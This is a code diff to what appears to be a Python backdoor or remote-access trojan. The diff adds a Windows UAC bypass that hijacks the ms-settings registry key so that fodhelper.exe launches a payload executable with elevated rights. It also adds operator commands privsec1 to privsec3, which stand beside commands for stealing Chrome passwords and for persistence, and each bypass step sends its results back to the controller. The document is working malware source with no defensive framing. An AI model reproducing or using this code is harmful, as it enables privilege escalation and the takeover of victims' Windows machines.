@@ -26,17 +26,22 @@ def reliable_send(data):
 
 
 
-def priv():
-    execute = subprocess.run(['powershell', 'New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "cmd.exe" -Force'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+def priv1():
+    execute = subprocess.run(['powershell', 'New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "C:\Genymobile\payload.exe" -Force'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
     result = execute.stdout + execute.stderr
     result = result.decode()
+    reliable_send(result)
+
     
-    execute1 = subprocess.run(['powershell', 'New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "cmd.exe" -Force'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+def priv2():
+    execute1 = subprocess.run(['powershell', 'New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "C:\Genymobile\payload.exe" -Force'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
     result1 = execute1.stdout + execute1.stderr
     result1 = result1.decode()
-    
+    reliable_send(result1)
+
+def priv3():
     execute2 = subprocess.run(['powershell', 'Start-Process "C:\\Windows\\System32\\fodhelper.exe"'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
     result2 = execute2.stdout + execute2.stderr
@@ -477,11 +482,27 @@ def shell():
             chrome_pass()
 
 
-        elif command == 'privsec':
+        elif command == 'privsec1':
             try:
-                priv()
+                priv1()
             except:
                 pass
+
+
+
+        elif command == 'privsec2':
+            try:
+                priv2()
+            except:
+                pass
+
+
+        elif command == 'privsec3':
+            try:
+                priv3()
+            except:
+                pass
+                
 
     
         elif command == 'persistence1':
